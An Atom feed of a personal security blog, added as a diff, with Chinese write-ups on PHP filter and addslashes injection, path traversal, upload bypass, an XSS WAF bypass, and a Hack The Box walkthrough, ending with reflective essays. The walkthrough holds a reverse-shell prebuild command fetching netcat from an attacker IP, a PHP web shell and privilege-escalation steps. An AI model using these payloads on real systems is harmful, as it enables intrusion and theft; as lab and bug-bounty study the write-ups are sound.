@@ -1,0 +1,549 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://m1crofan.github.io</id>
+    <title>m1cr0fan&apos;sBlog</title>
+    <updated>2024-05-28T12:57:35.764Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://m1crofan.github.io"/>
+    <link rel="self" href="https://m1crofan.github.io/atom.xml"/>
+    <logo>https://m1crofan.github.io/images/avatar.png</logo>
+    <icon>https://m1crofan.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, m1cr0fan&apos;sBlog</rights>
+    <entry>
+        <title type="html"><![CDATA[Frp内网穿透]]></title>
+        <id>https://m1crofan.github.io/DGqa3C2U_/</id>
+        <link href="https://m1crofan.github.io/DGqa3C2U_/">
+        </link>
+        <updated>2024-05-28T12:57:00.000Z</updated>
+        <content type="html"><![CDATA[<p>内网穿透工具</p>
+<p>用法</p>
+<p>1<br>
+./frpc -c frpc.ini<br>
+2<br>
+./frps -c frps.ini<br>
+配置文件</p>
+<p>frpc.ini</p>
+<p>1<br>
+[common]<br>
+2<br>
+server_addr = vps_ip<br>
+3<br>
+server_port = 7000<br>
+4<br>
+token = 1111<br>
+5<br>
+use_encryption = true<br>
+6<br>
+use_compression = true<br>
+7<br>
+​<br>
+8<br>
+[socks5]<br>
+9<br>
+type = tcp<br>
+10<br>
+remote_port = 6000 #使用vps的6000端口即可访问内网资源<br>
+11<br>
+plugin = socks5<br>
+frps.ini</p>
+<p>1<br>
+[common]<br>
+2<br>
+bind_port = 7000<br>
+3<br>
+token = 1111<br>
+注意事项</p>
+<p>最新版本配置文件不再是.ini 推荐使用2021年左右的版本</p>
+<p>使用uname -a 查看机器的架构；对应使用wget下不同的编译版本。</p>
+<p>记得给chmod +x frpc 给二进制文件可执行权限。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[prase_url()&addslashes()]]></title>
+        <id>https://m1crofan.github.io/i7_D7XJFB/</id>
+        <link href="https://m1crofan.github.io/i7_D7XJFB/">
+        </link>
+        <updated>2024-05-19T01:43:27.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="prase_url函数">prase_url函数</h3>
+<p>​	我们首先来看一段代码</p>
+<pre><code class="language-php">&lt;?php 
+$data = parse_url($_SERVER['REQUEST_URI']); 
+var_dump($data);
+$filter=array(&quot;aaa&quot;,&quot;qqqq&quot;);
+foreach($filter as $f)
+{ 
+	if(preg_match(&quot;/&quot;.$f.&quot;/i&quot;, $data['query']))
+	{ 
+		die(&quot;Attack Detected&quot;); 
+	} 
+} 
+
+?&gt;
+
+</code></pre>
+<p>首先要明白这个函数的逻辑是啥</p>
+<pre><code class="language-php">$data = parse_url($_SERVER['REQUEST_URI']);
+</code></pre>
+<p>这行代码使用 <code>parse_url</code> 函数解析当前请求的URL，并将结果存储在 <code>$data</code> 数组中。<code>$_SERVER['REQUEST_URI']</code> 包含了当前请求的完整URI。$_SERVER是PHP的一个超全局变量，用于存储Web服务器和运行环境创建的信息。</p>
+<p><code>var_dump()</code> 是 PHP 中一个非常有用的函数，用于输出变量的详细信息，包括类型和值。它可以用于调试代码、了解变量的结构和内容，以及进行变量类型的检查。</p>
+<p>正则匹配的语法</p>
+<pre><code class="language-php"> &quot;/&quot;.$f.&quot;/i&quot;
+</code></pre>
+<ul>
+<li><code>&quot;/&quot;</code>：正则表达式的起始定界符。</li>
+<li><code>$f</code>：变量，表示要匹配的模式字符串。</li>
+<li><code>&quot;/&quot;</code>：正则表达式的结束定界符。</li>
+<li><code>i</code>：修饰符，表示不区分大小写进行匹配。</li>
+</ul>
+<h3 id="hack-fun">hack fun</h3>
+<p>我们对上面那段代码做一个尝试</p>
+<p>访问1：</p>
+<pre><code class="language-url">http://www.phpstudy.com/test.php?a=1
+</code></pre>
+<p>返回结果：</p>
+<pre><code class="language-php">array(2) { [&quot;path&quot;]=&gt; string(9) &quot;/test.php&quot; [&quot;query&quot;]=&gt; string(3) &quot;a=1&quot; }
+</code></pre>
+<p>访问2：构造畸形访问</p>
+<pre><code class="language-url">http://www.phpstudy.com//test.php?/aaa
+</code></pre>
+<p>返回结果</p>
+<pre><code class="language-php">array(2) { [&quot;host&quot;]=&gt; string(9) &quot;test.php?&quot; [&quot;path&quot;]=&gt; string(4) &quot;/aaa&quot; }
+Notice: Undefined index: query in D:\phpstudy_pro\WWW\www.phpstudy.com\test.php on line 7
+
+Notice: Undefined index: query in D:\phpstudy_pro\WWW\www.phpstudy.com\test.php on line 7
+</code></pre>
+<p>可以看到 ：parse_url()会认为 <code>test.php?</code>是host 、<code>/aaa</code>是路径</p>
+<p>访问3：</p>
+<pre><code class="language-url">http://www.phpstudy.com///test.php?/aaa
+</code></pre>
+<p>返回结果</p>
+<pre><code class="language-php">bool(false)
+</code></pre>
+<p>其中<code>//</code>只适用于php5.4.7以前，<code>///</code>适用于php7</p>
+<h3 id="addslashes">addslashes()</h3>
+<p>话不多说，直接上题</p>
+<pre><code class="language-php">&lt;?php
+$str = addslashes($_GET['option']);
+$file = file_get_contents('xxxxx/option.php');
+$file = preg_replace('|\$option=\'.*\';|', &quot;\$option='$str';&quot;, $file);
+file_put_contents('xxxxx/option.php', $file);
+?&gt;
+</code></pre>
+<p>首先理解这段代码的逻辑</p>
+<pre><code class="language-php">$str = addslashes($_GET['option']);
+</code></pre>
+<p><code>$_GET</code>老朋友了，就是获取GET参数<code>option</code></p>
+<p><code>addslashes()</code>函数，这个有点眼熟；但是忘记了，搜索一番发现，这是一个转义的函数。</p>
+<pre><code class="language-php">$file = file_get_contents('xxxxx/option.php');
+</code></pre>
+<p><code>file_get_contents()</code>函数：输入是一个路径，输出是该路径下的内容。</p>
+<pre><code class="language-php">$file = preg_replace('|\$option=\'.*\';|', &quot;\$option='$str';&quot;, $file);
+</code></pre>
+<p><code>preg_replace()</code>函数是对文件内容进行正则表达式替换操作。它会查找文件中形如<code>$option='xxx'</code>;这样的字符串，并将其替换为<code>$option=$str</code>;</p>
+<p>正则表达式: <code>|\$option=\'.*\';|</code></p>
+<ul>
+<li><code>|</code>: 正则表达式的定界符，可以使用任何非字母、非数字、非反斜杠的字符作为定界符号。</li>
+<li><code>\$option=</code>:这部分匹配了字符串中的<code>$option=</code>。<code>$</code>在正则表达式中是特殊字符，需要使用反斜杠<code>\</code>进行转义。</li>
+<li>\`:这部分匹配单引号。</li>
+<li><code>.*</code> :匹配任意数量的任意字符（除了换行符）。<code>.</code>表示匹配任意单个字符，<code>*</code> 表示匹配前面的字符零次或多次。</li>
+</ul>
+<pre><code class="language-php">file_put_contents('xxxxx/option.php', $file);
+</code></pre>
+<p>最后一行使用 <code>file_put_contents()</code>函数将修改后的文件内容写回到名为<code>option.php</code>的文件中，完成对文件的更新操作。</p>
+<h3 id="hack-fun-2">hack fun</h3>
+<h4 id="方法1">方法1</h4>
+<p>这个漏洞触发逻辑用一句话概括就是：逃离数据域，到达代码逻辑域。</p>
+<p>由于正则匹配会匹配除换行符以外的字符；并且<code>addslashes()</code>也不会转义换行符<code>%0a</code></p>
+<p>第一次payload</p>
+<pre><code class="language-php">?option=abc';phpinfo();%0a//
+</code></pre>
+<p>此时option.php中的内容为</p>
+<pre><code class="language-php">&lt;?php
+	$option = 'aaa\';phpinfo();
+	//';
+?&gt;
+</code></pre>
+<p>第二次随便传入什么</p>
+<pre><code class="language-php">?option=def
+</code></pre>
+<p>此时option.php中的内容为：</p>
+<pre><code class="language-php">&lt;?php
+	$option = 'def';phpinfo();
+	//';
+?&gt;
+</code></pre>
+<p>正则匹配直接把转义符也替换掉了🤣</p>
+<h4 id="方法二">方法二</h4>
+<p>payload</p>
+<pre><code class="language-url">option=;&amp;option=%5c%27;phpinfo();//
+</code></pre>
+<p><code>%5c</code> 是反斜杠的html编码</p>
+<p><code>addslashes()</code>只能转换单引号；而不转换反斜杠 ；所以能成功。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[baby_csp]]></title>
+        <id>https://m1crofan.github.io/7T26boCLX/</id>
+        <link href="https://m1crofan.github.io/7T26boCLX/">
+        </link>
+        <updated>2024-05-14T08:31:23.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
+<p>在p牛的知识星球看到一个php的帖子，最近几年安全研究员都仅跟潮流研究java安全。php还是很少见，这引起了我的好奇。</p>
+<h3 id="环境">环境</h3>
+<p>Dockerfile</p>
+<pre><code>FROM php:apache
+COPY index.php /var/www/html
+</code></pre>
+<p>index.php</p>
+<pre><code class="language-php">&lt;?php
+header(&quot;Content-Security-Policy:default-src 'none';&quot;);
+if(isset($_GET[&quot;xss&quot;])) echo $_GET[&quot;XSS&quot;];
+?&gt;
+</code></pre>
+<p>根据Dockerfile创建镜像</p>
+<ul>
+<li>
+<p>在含有Dockerfile的文件下运行这条命令</p>
+</li>
+<li>
+<p>虚拟机最好是要挂代理，下载会很快</p>
+</li>
+</ul>
+<pre><code class="language-shell">docker build -t myphpxss .
+</code></pre>
+<p>根据镜像创建docker容器</p>
+<ul>
+<li>踩坑点：这条命令是指把容器的80端口映射给本机8080端口。此处，容器的端口一定要是80，本机端口无所谓。</li>
+</ul>
+<pre><code class="language-shell">docker run -d -p 8080:80 myphpxss
+</code></pre>
+<h3 id="hackfun">hackfun</h3>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240514161104324.png" alt="image-20240514161104324" loading="lazy"></figure>
+<p>P牛给的原理：</p>
+<p>PHP继承了CGI的特性，输出就等于写入HTTP response，<strong>一旦开始写入response，就无法再设置header</strong>。在这道题目里，echo在header()后面执行，所以正常来讲header()执行不会遇到问题。 但这里可以使用到一个trick：默认情况下max_input_vars的值是1000，也就是PHP最多接受1000个参数。一旦超过这个数量，PHP就会出错并产生一个Warning。Docker PHP环境默认的error_reporting是空，即为E_ALL &amp; ~E_NOTICE &amp; ~E_STRICT &amp; ~E_DEPRECATED，会显示除了E_NOTICE、E_STRICT、E_DEPRECATED以外的所有错误信息。 由于参数解析过程发生在脚本执行以前，<strong>错误信息写入response会导致header()函数执行出错，最终CSP头无法输出</strong>，XSS成功执行。 我记得之前CTF也出现过类似的考点，但这道题确实体现了“浓缩就是精华”的道理。 通常情况下，为了解决错误信息输出导致header()函数执行失败的问题，我们可以给output_buffering选项设置一个值，比如4096。当output_buffering大于0时，输出数据则会先存放于对应大小的缓冲区中，只有输出的内容大于缓冲区大小时，response才会实际写入。由于Docker默认PHP环境的output_buffering等于0，没有任何缓冲区，这也是这个CTF能够实现的必要条件。</p>
+<p>P牛还问了一个问题：</p>
+<p>​	除了1000个参数以外，你还能找到哪些方法在脚本执行前触发错误并输出错误信息？</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SRC挖掘案例]]></title>
+        <id>https://m1crofan.github.io/HeZFM969Z/</id>
+        <link href="https://m1crofan.github.io/HeZFM969Z/">
+        </link>
+        <updated>2024-04-25T13:29:26.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="服务器文件读取">服务器文件读取</h3>
+<p>漏洞功能点在首页的Logo展示处，只有首次打开此APP时，才会远程下载此图片。加载图片的GET请求包如下：</p>
+<pre><code class="language-http">GET /ixxx/LogonImage.do?ImageDir=/img/2024/4/25&amp;SaveImageName=microfan.jpg HTTP/1.1
+Host xxxx.com
+</code></pre>
+<p>第一个尝试：空文件名测试当空文件名时，是否会列出目录结构。</p>
+<p>第二个尝试：路径的目录穿越，payload如下</p>
+<pre><code class="language-http">GET /ixxx/LogonImage.do?ImageDir=/img/2024/4/25/../../../../../etc/&amp;SaveImageName=passwd HTTP/1.1
+Host xxxx.com
+</code></pre>
+<p>测试结果是：被waf拦截。</p>
+<blockquote>
+<p>提一嘴，这种情况下一般我就放弃了（汗流浃背）。</p>
+</blockquote>
+<p>测试发现waf拦截特征：<code>../</code></p>
+<p>柳暗花明又一村</p>
+<pre><code class="language-http">GET /ixxx/LogonImage.do?ImageDir=/&amp;SaveImageName=.bash_history HTTP/1.1
+Host xxxx.com
+</code></pre>
+<p>读取根目录下的.bash_history;通过读取这个文件，读取到了一些敏感的文件。</p>
+<blockquote>
+<p>ChatGPT:</p>
+<p>.bash_history是一个用于存储用户在Bash shell中执行的命令历史记录的文件。每当用户在Bash shell中输入并执行一个命令时，该命令都会被添加到.bash_history文件中。这样，用户就可以方便地查看和重复之前执行过的命令，提高工作效率。</p>
+<p>.bash_history文件通常位于用户的home目录下。在大多数情况下，它的完整路径是/home/用户名/.bash_history，其中“用户名”是你的用户账户的名称。你可以使用ls命令来查看该文件是否存在，或者使用cat、less等命令来查看其内容。</p>
+</blockquote>
+<p>敏感文件的文件名结构：/Nxxxxx/xxFile/xx_20240425_51xxx.txt</p>
+<p>看文件名结构可知：文件名是由时间戳+ID顺序编号组成的，我们可以轻松遍历全部敏感信息🤭。</p>
+<h4 id="总结">总结</h4>
+<p>通过读取Linux系统的bash_history文件，通过管理员的输入命令记录获取目录结构，从而进一步读取其他敏感文件扩大危害。</p>
+<h3 id=""></h3>
+<h3 id="信息泄露getshell">信息泄露+Getshell</h3>
+<p><strong>信息泄露</strong></p>
+<p>使用bp对注册页面register.do功能页面，爆破.do的功能路径；爆破出一个http://xxx/user.do路径泄露全部的用户信息，包括姓名、手机号、密码哈希、用户上传文件等信息。</p>
+<p><strong>上传</strong></p>
+<p>上传文件功能的数据包URL如下：</p>
+<pre><code class="language-http">POST /fileUpload.do?maxsize=1024&amp;path=test&amp;uploader&amp;filetype=.doc,.txt,.docx,.jpg,.png HTTP/1.1
+HOST: xxx.xxx.xx.xx
+</code></pre>
+<p>这个非常熟悉，实习时候也碰到过一样的情况，只需要将filetype添加一个jsp 或 jspx 就可以。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[HTB之Visual靶机篇]]></title>
+        <id>https://m1crofan.github.io/KDPuG8FgX/</id>
+        <link href="https://m1crofan.github.io/KDPuG8FgX/">
+        </link>
+        <updated>2024-03-27T12:52:52.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x00-htb"><strong>0x00 HTB</strong></h3>
+<p>使用nmap扫描目标ip</p>
+<pre><code class="language-shell">nmap -p-  --min-rate=1000 10.10.11.234
+</code></pre>
+<p>可以看到，开放了80端口</p>
+<p>给定的ip有一个Web站点，该站点有个功能点是能够在线编译<code>.NET</code>或<code>C#</code>的网站。</p>
+<p>存在的漏洞是：.NET预编译过程可以执行预编译事件；我们可以通过定义预编译事件执行系统命令，反弹shell。.NET定义预编译事件的文件名为<code>.csproj</code>。如下所示：</p>
+<pre><code class="language-xml">&lt;Project Sdk=&quot;Microsoft.NET.Sdk.Web&quot;&gt;
+
+  &lt;PropertyGroup&gt;
+    &lt;TargetFramework&gt;net6.0&lt;/TargetFramework&gt;
+    &lt;LangVersion&gt;preview&lt;/LangVersion&gt;
+	&lt;PreBuildEvent&gt;powershell.exe -c &quot;curl http://10.10.16.3:8081/nc64.exe -o C:/Windows/Tasks/nc.exe; C:/Windows/Tasks/nc.exe 10.10.16.3 9001 -e powershell&quot;&lt;/PreBuildEvent&gt;
+  &lt;/PropertyGroup&gt;
+
+  &lt;ItemGroup&gt;
+    &lt;PackageReference Include=&quot;Microsoft.OpenApi&quot; Version=&quot;1.3.0-preview&quot; /&gt;
+    &lt;PackageReference Include=&quot;Swashbuckle.AspNetCore&quot; Version=&quot;6.2.1&quot; /&gt;
+  &lt;/ItemGroup&gt;
+
+  &lt;ItemGroup&gt;
+    &lt;ProjectReference Include=&quot;..\Sample.DotNet6.Api.Core\Sample.DotNet6.Api.Core.csproj&quot; /&gt;
+  &lt;/ItemGroup&gt;
+
+&lt;/Project&gt;
+</code></pre>
+<p>反弹shell的payload为：</p>
+<pre><code class="language-bash">powershell.exe -c &quot;curl http://10.10.16.2:8081/nc64.exe -o C:/Windows/Tasks/nc.exe; C:/Windows/Tasks/nc.exe 10.10.16.2 9001 -e powershell&quot;
+</code></pre>
+<ul>
+<li>使用powershell执行<code>&quot;&quot;</code>中的命令；下载目标8081端口的netcat并保存到<code>C:/Windows/Tasks/nc.exe</code>这个目录下。</li>
+<li>执行Netcat建立一个反向连接，反向连接成功后将输入和输出重定向到Powershell进程。</li>
+</ul>
+<h3 id="0x01-后门攻击"><strong>0x01 后门攻击</strong></h3>
+<p>clone一个<code>.NET</code>项目</p>
+<pre><code class="language-shell">git clone https://github.com/hgmauri/sample-dotnet6
+</code></pre>
+<p>修改其中的<code>.csproj</code>文件如0x00中所提到的。</p>
+<p>配置apache2来托管我们的git存储库。需要的模块如下：</p>
+<pre><code class="language-shell">sudo a2enmod cgi
+sudo a2enmod alias
+sudo a2enmod env
+sudo service apache2 resart
+</code></pre>
+<p>之后创建目录、修改目录所有者为Apache</p>
+<pre><code class="language-shell">sudo mkdir /var/www/html/git-repos
+sudo chown -R www-data:www-data /var/www/html/git-repos
+</code></pre>
+<p>添加如下内容到Apache2的配置文件/etc/apache2/apache2.conf</p>
+<pre><code class="language-shell">ScriptAlias /git/ /usr/lib/git-core/git-http-backend/ 
+SetEnv GIT_PROJECT_ROOT /var/www/html/git-repos 
+SetEnv GIT_HTTP_EXPORT_ALL 
+Options +ExecCGI AddHandler cgi-script .cgi 
+DirectoryIndex gitweb.cgi 
+&lt;Directory /usr/lib/git-core&gt; 
+	Require all granted 
+&lt;/Directory&gt;
+</code></pre>
+<p>这段内容主要在做一些目录映射，以及一些git相关配置的事情。</p>
+<p>初始化Git仓库</p>
+<pre><code class="language-shell">git init
+git add .
+git commit -m &quot;2024-3-27&quot;
+</code></pre>
+<p>使用python的<code>http.server</code>模块提供http服务在8081端口；使用nc监听9001端口</p>
+<pre><code class="language-shell">python3 -m http.server 8080 
+rlwrap nc -lvnp 9001
+</code></pre>
+<blockquote>
+<p><code>rlwrap</code>是一个用于增强命令行输入的工具，作用是提供命令历史记录，命令补全等功能。</p>
+<p>-lvnp:告诉NetCat监听9001端口（p）、并且以监听模式（-l）、启用日志记录（-v）、不进行DNS解析（-n）</p>
+</blockquote>
+<h3 id="0x02-横向移动"><strong>0x02 横向移动</strong></h3>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240327150330762.png" alt="image-20240327150330762" loading="lazy"></figure>
+<p>成功反弹shell之后，开始横向移动。</p>
+<p>往web中写入shell</p>
+<pre><code class="language-shell">Set-Content -path &quot;C:\xampp\htdocs\cmd.php&quot; -Value '&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;'
+</code></pre>
+<p>再开一个netcat监听</p>
+<pre><code class="language-shell">rlwrap nc -lvnp 9001
+</code></pre>
+<p>在Web中访问这个URL</p>
+<pre><code class="language-shell">10.10.11.234/cmd.php?cmd=whoami
+</code></pre>
+<p>得到一个新账户</p>
+<pre><code class="language-html">nt authority\local service 
+</code></pre>
+<p>修改nc64.exe的权限</p>
+<pre><code class="language-shell">icacls.exe C:\windows\Tasks\nc.exe /grant Everyone:F
+</code></pre>
+<blockquote>
+<ul>
+<li><code>icacls.exe</code>是Windows上用来修改文件ACL（访问控制）的命令行工具。它允许用户控制对文件和目录的权限设置</li>
+<li><code>/grant Everyone:F</code> 授予所有组完全控制权限。</li>
+</ul>
+</blockquote>
+<p>访问下面这个URL反弹shell</p>
+<pre><code class="language-shell">/cmd.php?cmd=C:\windows\tasks\nc.exe%20-e%20powershell%2010.10.14.44%209001
+</code></pre>
+<h3 id="0x03-提权">0x03 提权</h3>
+<pre><code class="language-shell">PS C:\windows\temp&gt; whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION                              
+----------------------                              
+                                                    
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+</code></pre>
+<p>使用FullPowers恢复权限</p>
+<pre><code class="language-shell">PS C:\windows\temp&gt; wget 10.10.16.3:8081/FullPowers.exe -O c:\windows\temp\full1.exe
+wget 10.10.16.3:8081/FullPowers.exe -O c:\windows\temp\full1.exe
+PS C:\windows\temp&gt; .\full1.exe
+.\full1.exe
+[+] Started dummy thread with id 2224
+[+] Successfully created scheduled task.
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.17763.4851]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State  
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+
+</code></pre>
+<p>到此，成功的恢复了所有的权限，特别是恢复了SelmpersonatePrivilege。可以使用GodPotato进行提权。</p>
+<h3 id="0x04-总结">0x04 总结</h3>
+<p>金土豆提权我老是成功不了不知道为什么~ 可能缘分未到，哈哈哈哈 后面有机会再做。</p>
+<p>这是我第一次打HTB靶机，断断续续经历了四天。利用Web站点的<code>.NET</code>预编译植入命令，反弹shell。然后横向移动、恢复权限、提权。这整一个流程是我认知里的红队。</p>
+<p>搞渗透真的是太酷啦！！！😎</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[xss绕waf的小trick]]></title>
+        <id>https://m1crofan.github.io/2OHQ0OA1V/</id>
+        <link href="https://m1crofan.github.io/2OHQ0OA1V/">
+        </link>
+        <updated>2024-03-23T08:36:14.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>0x00</strong></p>
+<p>在翻某SRC的js文件的时候，发现了GET参数可控；情况大致如下</p>
+<pre><code class="language-javascript">&lt;script&gt;
+...
+    const order = 'microfan2'
+	const type = 'microfan1'
+...
+&lt;/script&gt;
+</code></pre>
+<p>经过测试发现网站存在WAF，以及后端会对传入的<code>&lt;&gt;</code> <code>&quot;&quot;</code>做HTML编码；但并不会对<code>'</code>、<code>()</code>做编码处理。此处的数据域在<code>&lt;script&gt;</code>标签内，感觉有戏。</p>
+<p>0x01</p>
+<p>xss本质属于注入漏洞；因此围绕着的核心思想就是：逃出数据域，进入逻辑域。</p>
+<p>经过多次尝试发现，虽然WAF并不会对<code>（）</code>、<code>''</code>做编码处理;但是会对其做匹配检测。如果一段payload中存在闭合的<code>()</code>则会对其进行拦截;而<code>)(</code>却不会拦截</p>
+<p>0x02</p>
+<p>成功的payload</p>
+<pre><code class="language-url">/index.php?type=*/1);%27&amp;order=%27;alert(1/*
+</code></pre>
+<p>response</p>
+<pre><code class="language-javascript">&lt;script&gt;	
+	const gift_order = '';
+	alert(1/*'
+	const gift_type = '*/);''
+&lt;/script&gt;
+</code></pre>
+<p>其中的关键点在于：使用多行注释、分号、单引号等使得逃离数据域成功执行弹窗~。分号的作用是让JavaScript解释器能够识别独立的语句。</p>
+<p>最后成功弹窗</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240323161048044.png" alt="image-20240323161048044" loading="lazy"></figure>
+<p>由于重重限制，最终也就仅能弹个窗；不能进行下一步有效的利用；但是绕waf的过程还是很有意思的~</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Web应用安全漏洞思维导图]]></title>
+        <id>https://m1crofan.github.io/ncdfY-9W_/</id>
+        <link href="https://m1crofan.github.io/ncdfY-9W_/">
+        </link>
+        <updated>2024-03-20T07:03:57.000Z</updated>
+        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://m1crofan.github.io/post-images/1710918270689.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[有感]]></title>
+        <id>https://m1crofan.github.io/jQ8O5fhDJ/</id>
+        <link href="https://m1crofan.github.io/jQ8O5fhDJ/">
+        </link>
+        <updated>2022-12-18T11:04:34.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="前言">前言</h4>
+<p>李樾老师在给南大21级学生上某一门课的最后结课时，给大家上了一堂人生课——除了专业知识，我们还应该。我看完那个视频后很有感触，并结合自己做一个记录。</p>
+<h4 id="汲取知识化为己用">汲取知识化为己用</h4>
+<ul>
+<li>
+<p>汲取知识：搜索能力、外文阅读能力等能收集到的一切知识。</p>
+</li>
+<li>
+<p>化为己用（系统性）</p>
+<ul>
+<li>要么系统性的把这个知识讲给别人听（开组会时候分享、写博客）。其中，系统性指的是学习时自底向上的把各种零碎的知识点学好，然后自顶向下的讲给别人听。</li>
+<li>要么写一个实际的东西出来，拿静态程序分析来说。学完之后，写一个漏洞分析器出来。这就是通过实践，把知识系统性的串起来。（可能若干年后会忘记具体的细节，可是以前写过解释器，未来就不怕写解释器，是自信建立和连接的过程。</li>
+</ul>
+</li>
+</ul>
+<h4 id="面对困难压力迷茫有积极应对的态度和勇气">面对困难压力迷茫有积极应对的态度和勇气</h4>
+<p>对于我个人而言，感受最深的就是，面对困难压力迷茫时会逃避，会逃避学习躺平。首先要明白的是，逃避这种心态是很正常的，首先要接纳自己这种心态。要明白，并不是发了四大顶会，并不是发了sci才有快乐的权力。能坐下来、静下心来学习也是一种进步，也是一种快乐。</p>
+<p>勇气很重要。当面对困难时、当面对不得不战胜的困难时；要拿出一种将军的气魄——兵来将挡，水来土掩。而能支撑这种气魄的是，让自己、家人未来过得更好的信念。</p>
+<blockquote>
+<p>对于22岁的我来说，是“来日苦多”，一定要有积极的心态。</p>
+</blockquote>
+<h4 id="理解他人-包容他人">理解他人、包容他人</h4>
+<p>这方面我从知识层面已经掌握了，但是面对生气的事和人，还是很难理解和包容他人。但是还有引用一些李越老师的原话。</p>
+<blockquote>
+<p>在面对与他人交际，会有很多的不解；甚至认为自己很不幸。有了这种包容的博爱之心，可以更轻松的与人交际。</p>
+</blockquote>
+<h4 id="原谅自己-爱自己">原谅自己、爱自己</h4>
+<p>有些事情会在夜深人静的时候时常想起它，很难摆脱它又不得不面对它。会让自己难受，甚至心口痛（是的😰），使得你在夜深人静的时候经常睡不着、经常拿这件事情干扰自己。</p>
+<blockquote>
+<p>我们往往说一个阶段要干成一件事情、要干好一件事；可是请仔细想想，我们真的应该这样做嘛？你说，我的父母的期待是这样，我不能让他们失望啊！我的朋友是这样，我不希望脱离那种环境，不希望掉对呀。我本身自己是要强的，我不希望脱后腿。</p>
+</blockquote>
+<p>慢慢的就不自信，你就想着毕业后我要找一份什么样的好工作，起码不比旁边同学差。起码赚够几年前，然后买房子付首付。实际上，在想这些的过程中，已经不知不觉被社会的价值观裹挟着往上走。你的人生本应该你自己做主，但是你不知不觉被别人推着走了。而且这个别人不是任何人，而是你自己塑造出来的一个社会价值观。</p>
+<p>总之，当你感到焦虑和抑郁的时候，不妨停下来，休息一下。休息是为了更好的出发。</p>
+<h4 id="be-different">Be different</h4>
+<p>在这样卷的环境中，做top固然好，可是top是需要运气的。有些人的幸运可能是这么多年靠家族的力量推上来（的确，我也从我的家族中有所收益）、靠自己天生的聪明等。</p>
+<blockquote>
+<p>我经常跟我的学生说：“你坐在这么多学生中间，谁记得你是谁，哪管你是不是TOP。我只能记住里面能记住的”。</p>
+</blockquote>
+<p>所以，做TOP并不是最重要的，而是要和别人不一样。如何不一样，就是做自己。因为自己天生有些特性，更容易和别人不一样。看看什么会让你快乐，你就在这一路上挖掘下去。</p>
+<h4 id="最后">最后</h4>
+<p>留十六个字，希望大家认识、挖掘、寻找自己；最重要的是认同自己并幸福快乐的走下去！😁</p>
+<blockquote>
+<p>知难而进   贵在坚持</p>
+<p>省察体悟   贵于改过</p>
+</blockquote>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[转载《聊聊太卷的学业生活》]]></title>
+        <id>https://m1crofan.github.io/zhuan-zai-lesslessliao-liao-tai-juan-de-xue-ye-sheng-huo-greatergreater/</id>
+        <link href="https://m1crofan.github.io/zhuan-zai-lesslessliao-liao-tai-juan-de-xue-ye-sheng-huo-greatergreater/">
+        </link>
+        <updated>2022-12-15T12:34:35.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
+<p>我在南大上《软件分析》的第一节课时，会有一个传统，就是简单地和学生们聊聊人生，这么做的动机是我发现现在的很多学生都很浮躁，没有深入思考或塑造过自己的价值观，个人价值观被当前的社会价值取向所左右，甚至裹挟，其结果是丰厚的年薪和体面的工作是衡量其人生是否成功的唯二标准，为此不惜加班熬夜，在资本铺出的路上透支狂奔，貌似只有拥有了自己的房子才可以开始享有人生，貌似只有在周遭的环境中脱颖而出才能证明自己不虚此生，来不及看风景，来不及顾家人，仿佛生活没有给你留什么时间，却又花大量时间去惆怅为什么生活使你艰难向前。接下来，请允许我开始正经起来，把送给南大《软件分析》课程学生的三句话也送给你，希望你能“不要浮躁，认识自己，重拾自信”，希望你能找到自己的路，快乐向前。</p>
+<h3 id="不要浮躁">不要浮躁</h3>
+<p>“我觉得自己明明很努力了，却还是学不懂，看到同学们在群里讨论着自己看不懂的专业知识，时常迷茫自己今后该何去何从”；“我周围的同学又是参加比赛获奖，又是科研经历丰富，我毕业后一点竞争优势也没有”；“我的同门发表了好多篇论文，可我什么都没有，不敢再想当初读研时的各种憧憬，现在只想着能毕业，给家人一个交代就好”。</p>
